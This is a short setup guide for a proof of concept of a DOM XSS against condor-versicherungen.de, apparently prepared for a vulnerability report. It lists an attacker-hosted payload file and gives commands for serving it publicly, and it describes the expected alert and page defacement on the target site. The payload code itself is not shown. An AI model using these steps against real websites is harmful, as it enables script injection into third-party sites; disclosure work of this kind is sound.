# PoC Setup — condor-versicherungen.de DOM XSS

## Files
```
poc.html                          ← Open this in browser
VAADIN/widgetsets/info.magnolia.PageEditor/
  info.magnolia.PageEditor.nocache.js   ← Attacker payload
```

## Deploy (GitHub Pages — fastest)
```bash
cd condor_xss_poc
git init && git add . && git commit -m "poc"
gh repo create condor-poc --public --push --source .
# URL: https://<YOUR-USERNAME>.github.io/condor-poc/poc.html
```

## Test locally (Python HTTPS — needs cert)
```bash
# Easier: use ngrok or localtunnel for quick HTTPS
python3 -m http.server 8080
npx ngrok http 8080
# Open: https://<ngrok-url>/poc.html
```

## What to screenshot for the report
1. poc.html opens with iframe of condor-versicherungen.de
2. After 1s: alert() fires saying "XSS executed in: https://www.condor-versicherungen.de"
3. Page rewrites to red defacement screen
4. Log panel shows "✅ XSS CONFIRMED"
5. Browser devtools Network tab: request to your server for the .nocache.js file
